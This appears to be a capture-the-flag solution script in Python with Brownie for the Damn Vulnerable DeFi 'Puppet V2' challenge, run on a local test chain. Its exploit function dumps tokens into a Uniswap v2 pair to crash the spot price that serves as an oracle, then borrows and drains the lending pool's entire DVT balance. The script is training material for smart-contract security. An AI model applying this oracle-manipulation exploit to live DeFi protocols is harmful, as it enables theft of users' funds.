# The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!

# Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

# You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)
from brownie import (accounts, 
                     Wei,
                     UniswapV2Factory,
                     UniswapV2Router02,
                     WETH9,
                     DamnValuableToken,
                     PuppetV2Pool,
                     UniswapV2Pair)
from brownie.network.state import Chain
from web3 import Web3

LENDING_POOL_DVT_TOKENS = Wei("1000000 ether")
UNI_PAIR_DVT = Wei("100 ether")
UNI_PAIR_ETH = Wei("10 ether")

def before():
    global ATTACKER
    ATTACKER = accounts[1]
    uni_factory = UniswapV2Factory.deploy(accounts[0],
                                          {"from": accounts[0]})
    global weth
    weth = WETH9.deploy({"from": accounts[0]})
    uni_router = UniswapV2Router02.deploy(uni_factory.address,
                                        weth.address,
                                        {"from": accounts[0]})
    global dv_token
    dv_token = DamnValuableToken.deploy({"from": accounts[0]})
    dv_token.approve(uni_router, UNI_PAIR_DVT,
                     {"from": accounts[0]})
    dv_token.transfer(ATTACKER.address, Wei("10000 ether"))
    pair_address = create_and_get_pair(uni_router, dv_token.address, uni_factory)
    global pair
    pair = UniswapV2Pair.at(pair_address)
    deadline = Chain().time() * 2
    global puppet_pool
    puppet_pool = PuppetV2Pool.deploy(weth.address,
                                      dv_token.address,
                                      pair_address,
                                      uni_factory.address,
                                      {"from": accounts[0]})
    dv_token.transfer(puppet_pool.address, LENDING_POOL_DVT_TOKENS,
                      {"from": accounts[0]})



def exploit():
    # intiate variables
    deployer = accounts[0]
    attacker = ATTACKER
    token = dv_token
    lending_pool = puppet_pool
    uni_factory = UniswapV2Factory[-1]
    uni_router = UniswapV2Router02[-1]
    
    # check the balance of the uniswap pool before the operations
    print(f'pair: {pair}')
    reserves = pair.getReserves()
    reserveToken = Web3.fromWei(reserves[0], "ether")
    reserveWETH = Web3.fromWei(reserves[1], "ether")
    print(f'uniswap reserveToken before: {reserveToken}')
    print(f'uniswap reserveWETH before: {reserveWETH}')

    # check the balances of the attacker before the operation
    print(f'attacker token balance before: {Web3.fromWei(token.balanceOf(attacker.address), "ether")}')
    print(f'attacker ETH balance before: {Web3.fromWei(attacker.balance(), "ether")}')

    # quote to buy all tokens in pool (amount = reserve) 
    quote = Web3.fromWei(uni_router.quote(Web3.toWei(100, "ether"), reserveToken, reserveWETH), "ether")
    print(f'uniswap quote ETH/token to buy all tokens: {quote}')

    # compute the deposit required to empty the pool
    depositRequired = lending_pool.calculateDepositOfWETHRequired(LENDING_POOL_DVT_TOKENS)
    print(f'puppetPool token balance (before): {Web3.fromWei(LENDING_POOL_DVT_TOKENS, "ether")}')
    print(f'puppetPool WETH deposit require (before): {Web3.fromWei(depositRequired, "ether")}')

    # approve the attacker token to send it to the uniswap pool
    token.approve(uni_router.address, Web3.toWei(10000, "ether"), {"from": attacker})

    # sell all DVT (10000) to uniswap pool to make the price crash
    path = [token.address, weth.address]
    deadline = Chain().time() * 2
    print(f'path[0]: {path[0]}')
    print(f'path[1]: {path[1]}')
    tx = uni_router.swapExactTokensForETH(
        Web3.toWei(10000, "ether"),
        1,
        path,
        attacker,
        deadline,
        {'from': attacker})
    print(f'uni swap tx 10000 token for weth: {tx}')

    # check the balance of the uniswap pool after the operations
    reserves = pair.getReserves()
    reserveToken = Web3.fromWei(reserves[0], "ether")
    reserveWETH = Web3.fromWei(reserves[1], "ether")
    print(f'uniswap reserveToken after: {reserveToken}')
    print(f'uniswap reserveWETH after: {reserveWETH}')

    # check the balances of the attacker after the operation
    print(f'attacker token balance after: {Web3.fromWei(token.balanceOf(attacker.address), "ether")}')
    print(f'attacker ETH balance after: {Web3.fromWei(attacker.balance(), "ether")}')
    print(f'attacker WETH balance after: {Web3.fromWei(weth.balanceOf(attacker.address), "ether")}')

    # transfer 29.5 ETH to WETH to be able to interact with the lending pool contract
    weth.deposit({'from': attacker, 'value': Web3.toWei(29.5, "ether")})
    print(f'attacker ETH balance after deposit weth: {Web3.fromWei(attacker.balance(), "ether")}')
    print(f'attacker WETH balance after deposit weth: {Web3.fromWei(weth.balanceOf(attacker.address), "ether")}')

    # # quote to buy all tokens in pool (amount = reserve) 
    # quote = Web3.fromWei(uni_router.quote(Web3.toWei(100, "ether"), reserveToken, reserveWETH), "ether")
    # print(f'uniswap quote ETH/token to buy all tokens: {quote}')

    # compute the deposit required to empty the pool
    depositRequired = lending_pool.calculateDepositOfWETHRequired(LENDING_POOL_DVT_TOKENS)
    print(f'puppetPool token balance (after): {Web3.fromWei(LENDING_POOL_DVT_TOKENS, "ether")}')
    print(f'puppetPool WETH deposit require (after): {Web3.fromWei(depositRequired, "ether")}')

    # approve the attacker WETH to send it to the lending pool
    weth.approve(lending_pool.address, Web3.toWei(300, "ether"), {"from": attacker})

    # borrow as much DVT as possible from thew puppet pool
    lending_pool.borrow(LENDING_POOL_DVT_TOKENS, {'from': attacker})

def after():
    assert DamnValuableToken[-1].balanceOf(PuppetV2Pool[-1].address) == 0
    assert DamnValuableToken[-1].balanceOf(ATTACKER.address) >= LENDING_POOL_DVT_TOKENS


def create_and_get_pair(router, token ,factory):
    deadline = Chain().time() * 2
    tx = router.addLiquidityETH(token,
                           UNI_PAIR_DVT,
                           0,
                           0,
                           accounts[0].address,
                           deadline,
                           {"from": accounts[0],
                            "amount": UNI_PAIR_ETH})
    pair = factory.getPair(token, WETH9[-1].address)
    return pair


def test_puppetV2_challenge():
    before()
    exploit()
    after()
    
    